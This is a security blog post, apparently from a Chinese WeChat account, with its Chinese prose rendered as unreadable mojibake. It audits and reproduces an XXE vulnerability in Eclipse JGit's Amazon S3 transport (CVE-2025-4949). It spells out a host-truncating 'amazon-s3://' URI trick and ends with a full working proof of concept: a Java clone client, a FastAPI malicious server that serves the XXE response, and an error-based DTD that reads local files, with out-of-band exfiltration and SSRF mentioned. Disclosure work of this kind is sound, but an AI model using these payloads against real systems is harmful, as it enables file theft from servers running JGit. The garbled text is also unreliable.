#  ã€ä»£ç å®¡è®¡&æ¼æ´å¤ç°ã€‘Eclipse JGit XXEæ¼æ´ CVE-2025-4949  
 é—ªçŸ³æ˜Ÿæ›œCyberSecurity   2025-06-11 03:49  
  
ğŸ‘‰ æœ¬äººæ˜¯ä¸€åæƒ³å½“é»‘å®¢çš„å®‰å…¨å·¥ç¨‹å¸ˆï¼Œæ¬¢è¿æ‚¨çš„é˜…è¯»ï¼ŒæœŸå¾…æ‚¨çš„å…³æ³¨ã€‚  
  
ğŸ’¡ æœ¬å…¬ä¼—å·è®°å½•æ–¹å‘ï¼šæ¸—é€æµ‹è¯•|ä»£ç å®¡è®¡|SDLCå»ºè®¾ã€‚  
  
## æ–‡ç« å¯¼è¯»  
- æœ¬æ–‡è®°å½• Eclipse JGit XXE æ¼æ´çš„å‘ç°å’Œåˆ©ç”¨è¿‡ç¨‹ã€‚  
- JGit æ˜¯ä¸€ä¸ª Java å®ç°çš„ Git æ“ä½œåº“ï¼Œå¹¿æ³›åº”ç”¨äº Java ç¨‹åºä¸­éœ€è¦å¤„ç†è¿œç«¯ Git ä»“åº“çš„åœºæ™¯ï¼ˆä¾‹å¦‚ä»£ç æ‹‰å–ï¼‰ã€‚  
## èƒŒæ™¯  
  
å»å¹´æˆ‘åœ¨æŒ–æŸå®‰å…¨å‚å•† SRC æ—¶å‘ç°ä»–ä»¬é›†æˆäº† JGitï¼Œé¡ºä¾¿æŒ–åˆ°äº†è¿™ä¸ªæ¼æ´ï¼Œæœ¬æ–‡å°†è¯¦ç»†è®°å½•è¯¥æ¼æ´çš„å®¡è®¡è¿‡ç¨‹ã€åŠå¤ç°æ–¹æ³•ã€‚  
  
ï¼ˆå¤‡æ³¨ï¼šè¿™ä¸ªCVEä¸æ˜¯æˆ‘æçš„ï¼‰  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7M5iafPmTz6PaIGzRv2fMZn68gILMO5nXuM6vMZ4a6mNz9yzbRufDr7Q/640?wx_fmt=png&from=appmsg "")  
  
ä¸çœ‹ç¬”è®°å†å²è¿˜ä¸çŸ¥é“è‡ªå·±è¿™ä¹ˆæ™šäº†è¿˜åœ¨å­¦ä¹ ~ã€‚  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7TdgHE9h9C3IqobgiaEav5CiaqtMibkBTJKEyB4yWamtyibmwnubiaCpewYw/640?wx_fmt=png&from=appmsg "")  
  
## ä»£ç å®¡è®¡è¿‡ç¨‹  
### 1. å®šä½Sinkç‚¹  
  
é€šè¿‡Fortifyæ‰«æå‘ç°ï¼Œåœ¨  
AmazonS3.java  
Â æ–‡ä»¶ä¸­å­˜åœ¨ XML è§£æé€»è¾‘ï¼Œå…¶è§£ææºä¸º HTTP å“åº”è¿”å›çš„ XML å†…å®¹ï¼Œä¸”æœªç¦ç”¨å¤–éƒ¨DTDå’Œå¤–éƒ¨å®ä½“ã€‚  
  
  
æ‰«æå™¨è™½å®šä½åˆ°Â   
Sink  
ç‚¹ï¼Œä½†æœªç»™å‡ºå®Œæ•´æ¼æ´åˆ©ç”¨é“¾ï¼Œæ¥ä¸‹æ¥çš„é‡ç‚¹åœ¨äºç¡®å®š HTTP è¯·æ±‚çš„ç›®æ ‡ URL æ˜¯å¦å¯è¢«å¤–éƒ¨ç”¨æˆ·æ§åˆ¶ã€‚  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7aWYWSFAdaCGBABzCEPp89C3DDbRJZ6yQfGnVpPIQQpcceBOMkcNqrg/640?wx_fmt=png&from=appmsg "")  
  
### 2. é€†å‘è¿½è¸ª  
  
åœ¨çŸ¥é“Sinkç‚¹ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯é•¿æ—¶é—´çš„  
Find Usages  
Â ï¼Œæƒ³æ‰¾åˆ°æ¼æ´åˆ©ç”¨å…¥å£ï¼Œç»ˆäºçš‡å¤©ä¸è´Ÿæœ‰å¿ƒäººï¼Œçœ¼ç›çäº†ã€‚  
  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7eO8ICRx44fjFFjiaicibWBMm5nhvARZD1iaGMVX1OPuXRbqGqCXkh8g3VQ/640?wx_fmt=png&from=appmsg "")  
  
### 3. æ­£å‘è¿½è¸ª  
- æ—¢ç„¶é€†å‘å®¡è®¡çš„æ–¹å¼æ— æ³•å¿«é€Ÿè¿˜åŸæ¼æ´åˆ©ç”¨é“¾ï¼Œé‚£å°±å°è¯•æ­£å‘å®¡è®¡ï¼Œå‰é¢æåˆ°æˆ‘æ˜¯åœ¨å®¡è®¡æŸä¸ªå®‰å…¨è®¾å¤‡çš„æ¼æ´ï¼Œé‚£å°±ä»å®ƒçš„åŠŸèƒ½ç‚¹å…¥æ‰‹ï¼Œç”¨æˆ·å¯è¾“å…¥  
Gitä»“åº“åœ°å€  
ã€‚  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC78eZ5JEc2bP7nAkzq9AZoEfTjYPByWNoyq33hrZOwfa0Phw0Wn0CNnw/640?wx_fmt=png&from=appmsg "")  
- åç«¯æ¥æ”¶åˆ°å‚æ•°ï¼Œé€šè¿‡  
JGit  
è¿›è¡Œä»£ç ä¸‹è½½ã€‚  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7rzIYDmKYZvwNvLeeZh95lgjLkLkOn76ibqeDmNePjw04mibHHpQGD9dA/640?wx_fmt=png&from=appmsg "")  
- é€šè¿‡åœ¨Â   
Git.cloneRepository().call()  
Â æ–¹æ³•è®¾ç½® Debug æ–­ç‚¹å¹¶è¿›è¡Œè°ƒè¯•ï¼Œæœ€ç»ˆæ¢³ç†å‡ºè§¦å‘ XXE çš„å®Œæ•´é“¾è·¯ã€‚  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7tWB96iaGk2QojwVhyeWiatbOq5wEHtANkCAdIiaWulHFvibeziaeSDjNRicA/640?wx_fmt=png&from=appmsg "")  
### 4. å…³é”®æ¼æ´åˆ©ç”¨é“¾åˆ†æ  
  
#### 4.1 è¯†åˆ«URI  
- ç”¨æˆ·è¾“å…¥çš„ URI ä¼šç»è¿‡Â   
org.eclipse.jgit.transport.URIish  
Â è§£æï¼Œè¯†åˆ«å…¶Â   
scheme  
ã€  
user  
ã€  
pass  
ã€‚  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7HrWwiaUvp6n3S0ko3dQeibwmbN331uejUFibvu3G35V7OrdYx0zVG1Ubw/640?wx_fmt=png&from=appmsg "")  
- å½“å‰æµ‹è¯•çš„Payload:  
https://github.com/WebGoat/WebGoat  
#### 4.2 åŒ¹é…Transport  
- org.eclipse.jgit.transport.Transport#open  
Â éå†8ä¸ª  
Transport  
Â ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„URIä¼ å…¥å…¶  
canHandle  
æ–¹æ³•ä¸­è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœè¿”å›ä¸º  
true  
ï¼Œåˆ™è°ƒç”¨æŒ‡å®š  
Transport  
Â è¿›è¡Œåç»­ä¸šåŠ¡ã€‚  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC72A8Ouqmgjic7E42dTZiat8zqO1haBPbc0tcwxLC6aGVKKQlkDj1Bo1QQ/640?wx_fmt=png&from=appmsg "")  
- canHandle  
Â æ ¡éªŒURIçš„schemeæ˜¯å¦å’Œé¢„æœŸçš„schemeä¸€è‡´ï¼Œ  
TransportAmazonS3  
çš„schemeæ˜¯  
amazon-s3  
ã€‚  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7sl95BibKJ3DUFicYdMxv0yYDoFFX8Af25p2kWPQddA4OHwosdo4LyTEQ/640?wx_fmt=png&from=appmsg "")  
- æ ¡éªŒå¿…è¦å­—æ®µæ˜¯å¦ä¸ºç©ºï¼Œé™¤äº†schemeè¦åŒ¹é…ï¼Œè¿˜æœ‰4ä¸ªå­—æ®µéœ€è¦ä¸ä¸ºç©º,è™½ç„¶å›¾ç‰‡ä¸Šåªæœ‰3ä¸ªå­—æ®µï¼Œä½†åç»­çš„å…¶ä»–ä¸šåŠ¡è¿‡ç¨‹ä¸­è¿˜æ ¡éªŒäº†passå­—æ®µã€‚  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7RRTJud9Gp7s8VdRSXcSAe0KrTYRKnBdvupYPqoUIzQkQ0GocNa4GIA/640?wx_fmt=png&from=appmsg "")  
- ä¸ºäº†å¯ä»¥è®©æˆ‘ä»¬é¡ºåˆ©è¿›å…¥  
TransportAmazonS3  
Â å½“å‰æµ‹è¯•æ‰€ç”¨payload:  
amazon-s3://user:pass@test/  
Â (æ³¨æ„ï¼šæœ€åæœ‰ä¸€ä¸ªæ–œæ ï¼Œä¸ç„¶pathä¼šä¸ºç©ºï¼Œæ— æ³•é€šè¿‡å¿…è¦å­—æ®µæ ¡éªŒã€‚ï¼‰è¿™é‡Œçš„  
test  
å­—ç¬¦ä¸²æ˜¯bucketï¼Œbucketæ˜¯æˆ‘ä»¬åç»­çš„é‡ç‚¹ã€‚  
#### 4.3 è§¦å‘ç¬¬ä¸€ä¸ª HTTP è¯·æ±‚  
- org.eclipse.jgit.transport.WalkRemoteObjectDatabase#readPackedRefs  
Â æœ€ç»ˆè°ƒç”¨ s3.get(bucket, key)ã€‚å…¶ä¸­ bucket æ¥è‡ªç”¨æˆ·è¾“å…¥ (test)ï¼Œkey å›ºå®šä¸º packed-refsã€‚  
- URLæ‹¼æ¥è§„åˆ™ï¼šhttp://{bucket}.s3.amazonaws.com/{key}  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7zbibeT5Co5XCYuyARTFQ8oaZAibHsMAuiabqhox0wbldsk13icpicWgtyBA/640?wx_fmt=png&from=appmsg "")  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7ppVCiaZr0TrTMoPuTficBD2V4rTfT2qt1fGn166VGBCozesLrAhicWo5Q/640?wx_fmt=png&from=appmsg "")  
  
- é—®é¢˜  
ï¼šæ‹¼æ¥å®Œçš„URLï¼š  
http://test.s3.amazonaws.com/packed-refs  
, è™½ç„¶bucketè¢«æ‹¼æ¥åˆ°äº†URLä¸­ï¼Œä½†æ˜¯ç°åœ¨çš„URLæœ€ç»ˆè¯·æ±‚çš„åŸŸåè¿˜æ˜¯  
s3.amazonaws.com  
ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©å®ƒè®¿é—®æˆ‘ä»¬è‡ªå·±çš„åŸŸåï¼Œè¿™æ ·æˆ‘ä»¬æ‰èƒ½æ§åˆ¶è¿”å›åŒ…çš„å†…å®¹ï¼Œå¹¶æ³¨å…¥XXE-payloadã€‚  
- ç»•è¿‡æ€è·¯  
ï¼šèªæ˜çš„ä½ å·²ç»æƒ³åˆ°äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ URL ç‰¹æ€§ï¼Œé€šè¿‡Â   
é—®å·ï¼ˆ?ï¼‰  
Â åˆ†å‰²åŸŸåä¸å‚æ•°ï¼Œä½¿Â   
s3.amazonaws.com  
Â å˜ä¸ºå‚æ•°éƒ¨åˆ†ã€‚è€ŒbucketæŒ‡å®šä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„åŸŸåã€‚  
- ä¿®æ”¹åçš„payload  
:  
amazon-s3://user:pass@xxoo.pro?/  
- æœ€ç»ˆç”Ÿæˆçš„URLæ˜¯ï¼š  
http://xxoo.pro?  
.s3.amazonaws.com/%2Fpacked-refs  
Â é€šè¿‡é—®å·æˆªæ–­ï¼Œs3çš„åŸŸåå°±æˆä¸ºäº†å‚æ•°ï¼Œè¯·æ±‚çš„åŸŸåæ˜¯æˆ‘ä»¬è‡ªå·±çš„åŸŸåxxoo.proã€‚  
#### 4.4 åŸŸåé•¿åº¦é™åˆ¶  
- ä¸å‡ºæ„å¤–çš„è¯ï¼Œå°±å‡ºæ„å¤–äº†ï¼Œå› ä¸ºåœ¨å‘èµ·è¯·æ±‚ä¹‹å‰è¿˜ä¼šç»è¿‡  
authorize  
Â æ–¹æ³•ï¼Œè¿™é‡Œä¼šå¯¹åŸŸååšåˆ‡åˆ†å¤„ç†ï¼Œå¦‚æœé•¿åº¦å°äº16ï¼ˆ  
s3.amazonaws.com  
çš„é•¿åº¦ï¼‰ï¼Œå°±ä¼šå‡ºç°ç´¢å¼•é”™è¯¯äº†ã€‚  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC718QqFvT7V5VOjdBAAqnMp4AATCTyavWQMD8TUtggbqosqDZDhs076A/640?wx_fmt=png&from=appmsg "")  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7DSibysk0Ssdibiacgc1DgL1gFheQ1xYfz1fsBPDwPicFTebR4UmJdzcKBg/640?wx_fmt=png&from=appmsg "")  
- è°ƒæ•´åçš„payloadï¼š  
amazon-s3://user:pass@src123456.xxoo.pro?/  
####   
#### 4.5 å¤„ç†ç¬¬ä¸€ä¸ªå“åº”åŒ…  
- org.eclipse.jgit.transport.WalkRemoteObjectDatabase#readPackedRefsImpl  
æ–¹æ³•ä¼šå¯¹ä¸Šé¢çš„ç¬¬ä¸€ä¸ªè¯·æ±‚çš„å“åº”åŒ…è¿›è¡Œè§£æï¼Œçœ‹æ˜¯å¦ç¬¦åˆè‡ªå·±çš„é¢„æœŸï¼Œå› ä¸ºä¸æ¶‰åŠXMLçš„è§£æï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿å…¶ä¸æŠ¥é”™å³å¯ã€‚  
- æˆ‘ä»¬è®©  
http://src123456.xxoo.pro?  
.s3.amazonaws.com/%2Fpacked-refs  
è¿”å›  
#test  
å³å¯ã€‚  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7uFQbqlWRzXiaicZJZ6mufbrm1gSe1HabJkiaZHmzdr0DD0sxbA5mERXibw/640?wx_fmt=png&from=appmsg "")  
- ç¼–å†™æ¥å£è¿”å›ï¼Œè¿™é‡Œæˆ‘ç”¨fastapiå†™äº†ä¸€ä¸ªæ¥å£ã€‚ï¼ˆæ–‡æœ«ä¼šè´´ä¸Šå®Œæ•´æ¥å£ä¿¡æ¯ï¼‰  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7kQudxbicEqro2ScuibQnaVfl4QOqWiaxDbTReMPz2E6MSO84qqGaYcBuA/640?wx_fmt=png&from=appmsg "")  
####   
#### 4.6 è§¦å‘ç¬¬äºŒä¸ªHTTPè¯·æ±‚ï¼Œè§¦å‘XXE  
- ç¬¬äºŒä¸ªè¯·æ±‚æ˜¯åœ¨  
org.eclipse.jgit.transport.TransportAmazonS3.DatabaseS3#readLooseRefs  
ä¸­çš„  
s3.list()  
Â ---  
lp.list()  
æ–¹æ³•ä¸­è§¦å‘ã€‚  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7ZjDxJ48ErAAQWTtAQ9UQW6ibcxLvIwxGqsN7wZAPWNObSSOzxmPyzSQ/640?wx_fmt=png&from=appmsg "")  
- è¯·æ±‚æ¥å£å¹¶å¯¹XMLè¿›è¡Œè§£æ  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7JNogjh3YnVGZlfC7giau7jPkEeiakibF8CQsDm6sicicCj6GVsTZvwONvBw/640?wx_fmt=png&from=appmsg "")  
- ç¬¬äºŒæ¬¡è¯·æ±‚çš„URLï¼š  
http://src123456.xxoo.pro?.s3.amazonaws.com/?prefix=/refs/  
- payloadæ— éœ€ä¿®æ”¹ï¼Œæœ€ç»ˆpayloadï¼š  
amazon-s3://user:pass@src123456.xxoo.pro?/  
####   
#### 4.7 å¤„ç†ç¬¬äºŒä¸ªå“åº”åŒ…  
- ä¸¤ä¸ªè¯·æ±‚çš„URLè·¯å¾„éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å‚æ•°ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹æˆ‘ä»¬çš„APIæ¥å£ï¼Œä½¿å…¶å¯ä»¥åŒæ—¶å…¼å®¹è¿™ä¸¤ä¸ªè¯·æ±‚ã€‚  
- å½“æˆ‘ä»¬è¯·æ±‚çš„å‚æ•°ä¸­åŒ…å«prefixï¼Œæˆ‘ä»¬å°±è¿”å›XXEçš„payloadï¼Œå…¶ä»–æƒ…å†µå°±è¿”å›#testã€‚  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC7b185MKjIxwPKRWBf1n2Slu4HciakTdtalvaNJ6JZZzEYEEFE50cbmUQ/640?wx_fmt=png&from=appmsg "")  
  
### æ•ˆæœå±•ç¤º  
  
é€šè¿‡æŠ¥é”™çš„æ–¹å¼è¯»å–åˆ°äº†æŒ‡å®šæ–‡ä»¶ä¸­çš„å†…å®¹ã€‚  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/IHHY4xBiax3EdN5hFRdmia42uibL7nwSTC71gmX7vXEaOpGxzOVicMWjRg5EZUSjml73j6ghldj1euicRdQsvrkCiapg/640?wx_fmt=png&from=appmsg "")  
### å°ç»“  
- è¯¥æ¼æ´è¢«åˆ©ç”¨çš„å‰æï¼šè¢«æ”»å‡»æœåŠ¡å™¨è¦å¯ä»¥è®¿é—®åˆ°æ”»å‡»è€…éƒ¨ç½²çš„æ¶æ„web  
- æ¼æ´å±å®³  
- å¦‚æœæŠ¥é”™ä¿¡æ¯ä¼šåœ¨æ¥å£ä¸­è¿”å›ï¼Œå°±å¯ä»¥å®ç°è¯»å–ç³»ç»Ÿæ–‡ä»¶å†…å®¹çš„æ•ˆæœã€‚  
- å¦‚æœç³»ç»Ÿä¸è¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œå°±åªèƒ½é€šè¿‡HTTP/FTPå¤–å¸¦è¯»å–æœ‰é™çš„æ•°æ®ã€‚  
- å¯ä»¥å®ç°SSRFï¼Œä½†æ„Ÿè§‰ä½œç”¨ä¸å¤§ï¼Œè€Œä¸”ä¸€èˆ¬JGitåœ¨å†…ç½‘ç”¨çš„æ¯”è¾ƒå¤šã€‚  
## æ¼æ´å¤ç°å®Œæ•´ä»£ç   
### å¯¼å…¥ä¾èµ–  
  
```
<dependency>
Â  Â Â <groupId>org.eclipse.jgit</groupId>
Â  Â Â <artifactId>org.eclipse.jgit</artifactId>
Â  Â Â <version>5.12.0.202106070339-r</version>
</dependency>
```  
  
### Payload  
```
packageÂ com.nixsolutions.xxe_demo;

importÂ org.eclipse.jgit.api.Git;
importÂ org.eclipse.jgit.api.errors.GitAPIException;
importÂ org.eclipse.jgit.transport.CredentialsProvider;
importÂ org.eclipse.jgit.transport.UsernamePasswordCredentialsProvider;
importÂ org.junit.Test;

importÂ java.io.File;

publicÂ classÂ JgitTestÂ {

Â  Â Â publicÂ voidÂ clone(File outputDir, String branch, String uri, String user, String pwd)Â throwsÂ GitAPIException {

Â  Â  Â  Â Â CredentialsProviderÂ credentialsÂ =Â newÂ UsernamePasswordCredentialsProvider(user, pwd ==Â nullÂ ?Â ""Â : pwd);

Â  Â  Â  Â Â tryÂ {
Â  Â  Â  Â  Â  Â  Git.cloneRepository()
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .setURI(uri)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .setBare(false)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .setBranch(branch)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .setDirectory(outputDir)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .setCredentialsProvider(credentials)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .call();
Â  Â  Â  Â  }Â catchÂ (Exception e) {
Â  Â  Â  Â  Â  Â  e.printStackTrace();
Â  Â  Â  Â  }
Â  Â  }

Â  Â Â @Test
Â  Â Â publicÂ voidÂ test()Â throwsÂ GitAPIException {
Â  Â  Â  Â Â StringÂ urlÂ =Â "amazon-s3://user:pass@src123456.xxoo.pro?/";
// Â  Â  Â  Â String url = "http1://github.com/WebGoat/WebGoat";
Â  Â  Â  Â  clone(newÂ File("/tmp/code/"),Â "master", url,Â "123",Â "333");
Â  Â  }
}

```  
### æ¶æ„æœåŠ¡ç«¯è¿”å›åŒ…ï¼ˆFastAPI ç¤ºä¾‹ï¼‰  
```
from fastapi import FastAPI, Request
from fastapi.responses import PlainTextResponse
app = FastAPI()

payload = '''<?xml version="1.0"Â encoding="utf-8"?>
<!DOCTYPEÂ dataÂ SYSTEMÂ "http://127.0.0.1:8000/error.dtd">
<data>&send;</data>'''

@app.get("/", response_class=PlainTextResponse)
async def root(request: Request):
Â  Â  raw_query = request.url.query
Â  Â  print(raw_query)
Â  Â  if "prefix" in raw_query:
Â  Â  Â  Â  return payload
Â  Â  return "#test"



if __name__ == "__main__":
Â  Â  import uvicorn
Â  Â  uvicorn.run(app, host="0.0.0.0", port=80)
```  
### XXE-Payload  
```
<!ENTITY %Â fileÂ SYSTEMÂ "file:///tmp/mm.txt">
<!ENTITY %Â filenameÂ "mm.txt">
<!ENTITY %Â evalÂ "<!ENTITY &#x25; error SYSTEM 'file:///%filename; æ–‡ä»¶å†…å®¹ï¼š%file;'>">
%eval;
%error;
```  
###   
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
